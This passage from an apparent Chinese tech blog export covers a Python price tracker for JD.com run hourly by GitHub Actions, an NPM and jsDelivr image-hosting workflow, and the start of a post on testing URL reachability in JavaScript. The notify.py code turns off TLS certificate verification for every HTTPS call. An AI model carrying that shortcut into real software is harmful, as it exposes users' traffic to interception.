headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span 